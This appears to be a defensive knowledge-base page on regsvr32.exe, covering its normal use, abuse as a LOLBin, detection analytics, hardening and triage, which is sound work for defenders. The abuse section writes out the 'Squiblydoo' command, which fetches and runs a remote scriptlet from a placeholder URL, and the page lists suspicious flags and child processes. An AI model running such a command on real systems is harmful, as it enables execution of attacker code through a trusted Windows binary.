---
title: regsvr32.exe
layout: post
permalink: /windows/regsvr32/
group: Processes
---

## Overview

regsvr32.exe is the built-in Windows utility used to register and unregister COM components, typically DLLs and OCX controls.

It loads a specified DLL and calls its exported `DllRegisterServer` or `DllUnregisterServer` functions.

Despite the name, regsvr32.exe is not a Registry editor. Its purpose is specifically to make COM components available, or unavailable, to the operating system.

### Expected Characteristics

#### Expected Locations

- %SYSTEMROOT%\System32\regsvr32.exe
- %SYSTEMROOT%\SysWOW64\regsvr32.exe

#### Typical Profile

- Rare during normal user activity
- Common during software installation
- Used by updaters and deployment tooling
- Frequently associated with COM component registration

## Why This Matters

regsvr32.exe is important during investigations because it can be abused to run arbitrary code whilst appearing to execute a trusted Microsoft binary.

Common attacker behaviours include:

- Registering malicious DLLs
- Loading remote scriptlets
- Executing code without writing a traditional executable to disk
- Establishing persistence via COM hijacking
- Masquerading as regsvr32.exe

### Relevant ATT&CK Techniques

- T1218.010 - Signed Binary Proxy Execution: Regsvr32
- T1055 - Process Injection
- T1546 - Event-Triggered Execution
- T1036 - Masquerading

### Investigation Objective

Determine whether regsvr32.exe is:

- Performing legitimate COM registration
- Being used by installation or deployment tooling
- Executing a malicious DLL
- Being abused as a LOLBin
- Being used to retrieve remote content

## Normal Behaviour

### Characteristics

#### Path

- C:\Windows\System32\regsvr32.exe
- C:\Windows\SysWOW64\regsvr32.exe

#### Signature

- Microsoft Windows Publisher

#### Parent Processes

Typical examples include:

- msiexec.exe
- Enterprise deployment tooling
- Software installers
- Application updaters

#### Command Line

Legitimate command lines are usually simple.

Examples:

    regsvr32.exe /s <dll>

#### DLL Characteristics

Typically:

- Microsoft-signed
- Vendor-signed
- Located under Program Files
- Located under System32
- Located within approved enterprise application directories

### Typical Activity

- Software installation
- Software upgrades
- COM registration
- ActiveX/OCX registration
- Enterprise application deployment

### Expected Behavioural Characteristics

regsvr32.exe:

- Is relatively uncommon outside installation activity
- Loads DLLs directly
- Does not need internet access
- Rarely creates child processes

## Abuse Patterns

### Path or Signature Mismatch

Investigate immediately if:

- regsvr32.exe executes outside System32 or SysWOW64
- The image is unsigned
- The filename is spoofed

Examples include:

    regsv32.exe

    regsrv32.exe

### Suspicious Parent Processes

Investigate regsvr32.exe launched by:

- Office applications
- Web browsers
- PowerShell
- wscript.exe
- cscript.exe
- Archive extraction tools

These relationships frequently indicate phishing-driven execution chains.

### Abnormal DLL Paths

Investigate DLLs loaded from:

- %TEMP%
- %APPDATA%
- %LOCALAPPDATA%
- %PUBLIC%
- User profile directories

Additional concerns include:

- Recently-created DLLs
- Randomised filenames
- GUID-style filenames
- Unsigned DLLs

### Remote Scriptlet Execution

A classic abuse pattern, commonly referred to as "Squiblydoo", resembles:

    regsvr32.exe /s /n /u /i:https://example.com/file.sct scrobj.dll

This should always be considered suspicious.

regsvr32.exe has very little legitimate reason to retrieve content from the internet.

### Suspicious Flag Combinations

Investigate:

- /i combined with non-standard content
- /n combined with /u
- URLs
- Encoded content
- Obfuscated strings

These combinations are frequently seen in red-team tooling and malware.

### Child Process Anomalies

regsvr32.exe should not typically launch:

    powershell.exe

    cmd.exe

    wscript.exe

    cscript.exe

    mshta.exe

Any unexpected child process should be investigated as high-severity activity.

## Detection Opportunities

### Command-Line Analytics

Monitor for:

- References to URLs
- scrobj.dll
- Remote content retrieval
- Encoded parameters
- Obfuscated strings

Among all available telemetry, command-line data is often the most useful indicator for regsvr32 abuse.

### Parent Process Monitoring

Investigate when regsvr32.exe is launched by:

- Office applications
- Browsers
- Script engines
- Other LOLBins

These parent-child relationships are typically uncommon.

### DLL Path Analytics

Alert when DLLs are loaded from:

- User-writeable locations
- Temporary directories
- Downloads folders
- Network shares

The DLL being loaded is often more important than regsvr32.exe itself.

### Network Activity

Investigate:

- regsvr32.exe connections to external systems
- DNS lookups
- URL retrieval
- Scriptlet downloads

Legitimate COM registration rarely requires network communication.

### LOLBin Hunting

Useful hunting pivots include:

- scrobj.dll usage
- Remote URLs
- Rare command lines
- Unusual DLL locations
- User-writable paths

### Correlated Activity

Review:

- Phishing events
- Office document execution
- Script execution
- PowerShell activity
- Persistence changes

High-confidence detections typically combine regsvr32 activity with other suspicious behaviour.

## False Positives

Although uncommon, legitimate regsvr32 activity still exists.

### Common Legitimate Scenarios

Examples include:

- Application installers
- Software updates
- Driver packages
- OEM software installation
- Enterprise deployment tools
- Legacy applications

### Validation Questions

Check:

- Was software being installed?
- Is the DLL signed?
- Is the DLL from a trusted vendor?
- Does the parent process make sense?
- Is the behaviour seen elsewhere in the environment?

### Estate Context

Legitimate COM registration activity often:

- Appears on multiple systems
- Occurs during change windows
- Uses known installation paths
- Involves recognised vendors

## Hardening Recommendations

### Application Control

Consider:

- WDAC
- AppLocker
- Application allow-listing

The objective is not necessarily to block regsvr32.exe, but to prevent unauthorised DLL execution.

### Restrict User-Writable Execution

Reduce opportunities for DLL execution from:

- %TEMP%
- %APPDATA%
- %LOCALAPPDATA%
- %PUBLIC%

Many regsvr32 abuse scenarios rely on attacker-controlled directories.

### Monitor Scriptlet Execution

Implement detections for:

- scrobj.dll
- Remote URLs
- Unusual flag combinations
- Network-connected regsvr32 activity

These are among the highest-value indicators of abuse.

### Attack Surface Reduction

Where appropriate:

- Restrict script execution
- Limit execution of downloaded content
- Reduce unnecessary COM dependencies

### Defensive Validation

Test:

- LOLBin detections
- Command-line visibility
- Network telemetry
- Detection rules for Squiblydoo-style execution

Controls should be assessed using realistic tradecraft rather than simplistic demonstrations.

## Triage Checklist

### Identity and Integrity

- Verify image path
- Verify digital signature
- Confirm filename is legitimate
- Review OriginalFileName metadata

### Lineage and Behaviour

- Review parent process
- Examine command line
- Identify suspicious flags
- Review child processes

### DLL and Scriptlet Context

- Review DLL path
- Review DLL signature
- Examine creation timestamps
- Identify remote content usage

### Scope and Environment

- Check prevalence across hosts
- Correlate with installation activity
- Correlate with update events
- Review surrounding security alerts

### Escalation Considerations

Escalate immediately if:

- Remote scriptlets are involved
- Unsigned DLLs are loaded
- Internet connectivity is observed
- Child-process anomalies are present

## ATT&CK References

- T1218.010 - Signed Binary Proxy Execution: Regsvr32
- T1055 - Process Injection
- T1546 - Event-Triggered Execution
- T1036 - Masquerading

## Related Topics

### Windows Processes

- rundll32.exe
- dllhost.exe
- mshta.exe
- powershell.exe
- taskhost.exe

### COM and Registration

- COM Registration
- ActiveX Controls
- OCX Components
- COM Hijacking

### MITRE ATT&CK

- T1218.010 - Signed Binary Proxy Execution: Regsvr32
- T1546 - Event-Triggered Execution
- T1036 - Masquerading
